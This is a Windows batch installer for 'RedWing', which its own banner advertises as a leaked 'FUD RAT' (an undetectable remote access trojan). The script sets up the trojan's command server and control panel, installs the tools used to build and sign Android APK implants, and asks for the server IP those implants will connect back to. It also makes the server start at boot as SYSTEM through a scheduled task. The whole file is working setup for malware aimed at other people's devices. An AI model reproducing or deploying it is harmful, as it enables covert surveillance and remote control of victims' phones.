@echo off
setlocal enabledelayedexpansion

echo.
echo   ====================================================
echo    REDWING - Best Crossplatform FUD RAT
echo    LEAKED BY OMNI ^| t.me/omnibotnet ^| omni.lc
echo   ====================================================
echo.

net session >nul 2>&1
if %errorLevel% neq 0 (
    echo   [!] Zapustite ot imeni Administratora! / Run as Administrator!
    pause
    exit /b 1
)

set "INSTALL_DIR=C:\RedWing"
set "TOOLS_DIR=%INSTALL_DIR%\tools"
set "SCRIPT_DIR=%~dp0"

if not exist "%SCRIPT_DIR%bin\windows\server.exe" (
    echo   [!] bin\windows\server.exe not found!
    pause
    exit /b 1
)
if not exist "%SCRIPT_DIR%source\decom" (
    echo   [!] source\decom not found!
    pause
    exit /b 1
)

mkdir "%INSTALL_DIR%" 2>nul
mkdir "%TOOLS_DIR%" 2>nul

call :step_java
call :step_apktool
call :step_buildtools
call :step_deploy
call :step_config
call :step_init
call :step_autostart
call :step_launch
goto :eof

REM ================================================================
REM  JAVA
REM ================================================================
:step_java
echo   [+] Checking Java...
java -version >nul 2>&1
if !errorLevel! equ 0 (
    echo   [+] Java OK.
    goto :eof
)

echo   [!] Java not found!

where winget >nul 2>&1
if !errorLevel! equ 0 (
    echo   [*] Installing Java via winget...
    winget install --id EclipseAdoptium.Temurin.17.JRE -e --accept-source-agreements --accept-package-agreements 2>nul
    call :refresh_path
    java -version >nul 2>&1
    if !errorLevel! equ 0 (
        echo   [+] Java installed via winget.
        goto :eof
    )
)

where choco >nul 2>&1
if !errorLevel! equ 0 (
    echo   [*] Installing Java via chocolatey...
    choco install temurin17jre -y 2>nul
    call :refresh_path
    java -version >nul 2>&1
    if !errorLevel! equ 0 (
        echo   [+] Java installed via chocolatey.
        goto :eof
    )
)

echo   [*] No package manager, installing Chocolatey...
call :install_choco

where choco >nul 2>&1
if !errorLevel! equ 0 (
    echo   [+] Chocolatey installed.
    echo   [*] Installing Java via chocolatey...
    choco install temurin17jre -y 2>nul
    call :refresh_path
    java -version >nul 2>&1
    if !errorLevel! equ 0 (
        echo   [+] Java installed via chocolatey.
        goto :eof
    )
)

echo   [*] Downloading Java directly...
call :download_java
call :refresh_path

java -version >nul 2>&1
if !errorLevel! neq 0 (
    echo   [!] Java install failed. Download manually: https://adoptium.net/
    pause
    exit /b 1
)
echo   [+] Java installed.
goto :eof

REM ================================================================
REM  APKTOOL
REM ================================================================
:step_apktool
echo   [+] Checking apktool...
set "PATH=%TOOLS_DIR%;!PATH!"
apktool --version >nul 2>&1
if !errorLevel! equ 0 (
    echo   [+] apktool OK.
    goto :eof
)

echo   [*] Installing apktool 2.10.0...
powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.10.0.jar','%TOOLS_DIR%\apktool.jar')" 2>nul

call :check_jar "%TOOLS_DIR%\apktool.jar"
if !errorLevel! neq 0 (
    echo   [*] Bitbucket failed, trying GitHub...
    powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('https://github.com/iBotPeaches/Apktool/releases/download/v2.10.0/apktool_2.10.0.jar','%TOOLS_DIR%\apktool.jar')" 2>nul
)

echo @echo off> "%TOOLS_DIR%\apktool.bat"
echo java -jar "%TOOLS_DIR%\apktool.jar" %%*>> "%TOOLS_DIR%\apktool.bat"

echo   [+] apktool installed.
goto :eof

REM ================================================================
REM  BUILD-TOOLS (apksigner + zipalign)
REM ================================================================
:step_buildtools
echo   [+] Checking Android build-tools...
set "PATH=%TOOLS_DIR%;!PATH!"
apksigner --version >nul 2>&1
if !errorLevel! equ 0 (
    echo   [+] apksigner OK.
    goto :eof
)

echo   [*] Installing Android build-tools...
powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('https://dl.google.com/android/repository/build-tools_r35-windows.zip','%TEMP%\bt.zip')" 2>nul

if not exist "%TEMP%\bt.zip" (
    echo   [!] Download failed.
    goto :bt_path
)

powershell -NoProfile -Command "Expand-Archive -Force '%TEMP%\bt.zip' '%TEMP%\bt-extract'" >nul 2>&1

for /d %%D in ("%TEMP%\bt-extract\*") do (
    if exist "%%D\zipalign.exe" (
        copy /y "%%D\zipalign.exe" "%TOOLS_DIR%\" >nul 2>&1
        if exist "%%D\apksigner.bat" copy /y "%%D\apksigner.bat" "%TOOLS_DIR%\" >nul 2>&1
        if exist "%%D\apksigner.jar" copy /y "%%D\apksigner.jar" "%TOOLS_DIR%\" >nul 2>&1
        if exist "%%D\lib" xcopy /E /I /Y /Q "%%D\lib" "%TOOLS_DIR%\lib" >nul 2>&1
        echo   [+] build-tools installed.
    )
)

rd /s /q "%TEMP%\bt-extract" 2>nul
del /q "%TEMP%\bt.zip" 2>nul

:bt_path
REM Add tools to system PATH
for /f "tokens=2*" %%A in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path 2^>nul') do set "SYS_PATH=%%B"
echo !SYS_PATH! | find /i "%TOOLS_DIR%" >nul 2>&1
if !errorLevel! neq 0 (
    setx /M PATH "!SYS_PATH!;%TOOLS_DIR%" >nul 2>&1
)
set "PATH=%TOOLS_DIR%;!PATH!"

apksigner --version >nul 2>&1
if !errorLevel! neq 0 (
    echo   [!] apksigner not working. Install Android SDK build-tools manually.
    pause
    exit /b 1
)
echo   [+] apksigner OK.
goto :eof

REM ================================================================
REM  DEPLOY FILES
REM ================================================================
:step_deploy
echo   [+] Deploying to %INSTALL_DIR%...
mkdir "%INSTALL_DIR%\data" 2>nul

copy /y "%SCRIPT_DIR%bin\windows\server.exe" "%INSTALL_DIR%\server.exe" >nul

if exist "%INSTALL_DIR%\decom" rd /s /q "%INSTALL_DIR%\decom" 2>nul
if exist "%INSTALL_DIR%\web" rd /s /q "%INSTALL_DIR%\web" 2>nul
xcopy /E /I /Y /Q "%SCRIPT_DIR%source\decom" "%INSTALL_DIR%\decom" >nul
xcopy /E /I /Y /Q "%SCRIPT_DIR%source\web" "%INSTALL_DIR%\web" >nul

echo   [+] Files deployed.
goto :eof

REM ================================================================
REM  CONFIGURATION
REM ================================================================
:step_config
echo.
echo   == Configuration ==
echo.

for /f "tokens=*" %%i in ('powershell -NoProfile -Command "try{(New-Object Net.WebClient).DownloadString('https://ifconfig.me').Trim()}catch{''}" 2^>nul') do set "EXTERNAL_IP=%%i"

if "!EXTERNAL_IP!"=="" (
    for /f "tokens=*" %%i in ('powershell -NoProfile -Command "try{(Get-NetIPAddress -AddressFamily IPv4|Where{$_.PrefixOrigin -ne 'WellKnown' -and $_.IPAddress -ne '127.0.0.1'}|Select -First 1).IPAddress}catch{''}" 2^>nul') do set "EXTERNAL_IP=%%i"
)
set "DEFAULT_IP=!EXTERNAL_IP!"

if "!DEFAULT_IP!"=="" set "DEFAULT_IP=127.0.0.1"

set /p "SERVER_IP=  [?] IP for APK builds (Enter = !DEFAULT_IP!): "
if "!SERVER_IP!"=="" set "SERVER_IP=!DEFAULT_IP!"

set /p "PORT=  [?] Port (Enter = 8080): "
if "!PORT!"=="" set "PORT=8080"

set /p "REG_MODE=  [?] Registration - open / closed (Enter = closed): "
if "!REG_MODE!"=="" set "REG_MODE=closed"
goto :eof

REM ================================================================
REM  INIT (first run — create DB + admin)
REM ================================================================
:step_init
echo.
echo   [+] Initializing server...

taskkill /f /im server.exe >nul 2>&1

set "INIT_INPUT=%TEMP%\rw-init-in.txt"
set "INIT_LOG=%TEMP%\rw-init-out.txt"

if "!REG_MODE!"=="closed" (
    set /p "ADMIN_LOGIN=  [?] Admin login (Enter = admin): "
    if "!ADMIN_LOGIN!"=="" set "ADMIN_LOGIN=admin"
    set /p "ADMIN_PASS=  [?] Admin password (Enter = auto): "
)

if "!REG_MODE!"=="closed" (
    echo !ADMIN_LOGIN!> "!INIT_INPUT!"
    echo !ADMIN_PASS!>> "!INIT_INPUT!"
) else (
    type nul > "!INIT_INPUT!"
)

cd /d "%INSTALL_DIR%"
start "" /b /min cmd /c "set SERVER_IP=!SERVER_IP!& set PORT=!PORT!& set REGISTRATION=!REG_MODE!& "%INSTALL_DIR%\server.exe" < "!INIT_INPUT!" > "!INIT_LOG!" 2>&1"

echo   [*] Waiting for init (8 sec)...
timeout /t 8 /nobreak >nul

if exist "!INIT_LOG!" (
    echo.
    for /f "usebackq delims=" %%L in ("!INIT_LOG!") do echo     %%L
    echo.
)

taskkill /f /im server.exe >nul 2>&1
timeout /t 2 /nobreak >nul

del /q "!INIT_INPUT!" 2>nul
del /q "!INIT_LOG!" 2>nul

echo   [+] DB initialized.
goto :eof

REM ================================================================
REM  AUTOSTART
REM ================================================================
:step_autostart
echo   [+] Creating autostart...

echo @echo off> "%INSTALL_DIR%\start.bat"
echo set "SERVER_IP=!SERVER_IP!">> "%INSTALL_DIR%\start.bat"
echo set "PORT=!PORT!">> "%INSTALL_DIR%\start.bat"
echo set "REGISTRATION=!REG_MODE!">> "%INSTALL_DIR%\start.bat"
echo set "PATH=%TOOLS_DIR%;%%PATH%%">> "%INSTALL_DIR%\start.bat"
echo cd /d "%INSTALL_DIR%">> "%INSTALL_DIR%\start.bat"
echo "%INSTALL_DIR%\server.exe">> "%INSTALL_DIR%\start.bat"

schtasks /delete /tn "RedWing" /f >nul 2>&1
schtasks /create /tn "RedWing" /tr "\"%INSTALL_DIR%\start.bat\"" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1
goto :eof

REM ================================================================
REM  LAUNCH
REM ================================================================
:step_launch
echo   [+] Starting server...
cd /d "%INSTALL_DIR%"
start "" /min "%INSTALL_DIR%\start.bat"
timeout /t 3 /nobreak >nul

echo.
echo   ================================================================
echo   RedWing is running!
echo.
echo   Panel:     http://!SERVER_IP!:!PORT!
echo   Directory: %INSTALL_DIR%
echo   Restart:   taskkill /f /im server.exe ^& "%INSTALL_DIR%\start.bat"
echo   Autostart: Task Scheduler - "RedWing"
echo   ================================================================
echo.
pause
goto :eof

REM ================================================================
REM  HELPER SUBROUTINES
REM ================================================================

:install_choco
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))" >nul 2>&1
set "PATH=%ALLUSERSPROFILE%\chocolatey\bin;!PATH!"
goto :eof

:download_java
powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('https://api.adoptium.net/v3/binary/latest/17/ga/windows/x64/jre/hotspot/normal/eclipse','%TEMP%\java-jre.zip')" 2>nul
if not exist "%TEMP%\java-jre.zip" goto :eof
echo   [*] Extracting Java...
powershell -NoProfile -Command "Expand-Archive -Force '%TEMP%\java-jre.zip' '%INSTALL_DIR%\java'" >nul 2>&1
for /d %%D in ("%INSTALL_DIR%\java\*") do (
    set "JAVA_HOME=%%D"
    set "PATH=%%D\bin;!PATH!"
    setx /M JAVA_HOME "%%D" >nul 2>&1
    for /f "tokens=2*" %%A in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path 2^>nul') do setx /M PATH "%%D\bin;%%B" >nul 2>&1
)
del /q "%TEMP%\java-jre.zip" 2>nul
goto :eof

:refresh_path
for /f "tokens=2*" %%A in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path 2^>nul') do set "PATH=%%B"
for /f "tokens=2*" %%A in ('reg query "HKCU\Environment" /v Path 2^>nul') do set "PATH=!PATH!;%%B"
set "PATH=%TOOLS_DIR%;%ALLUSERSPROFILE%\chocolatey\bin;!PATH!"
goto :eof

:check_jar
if not exist "%~1" exit /b 1
for %%F in ("%~1") do if %%~zF LSS 100000 exit /b 1
exit /b 0
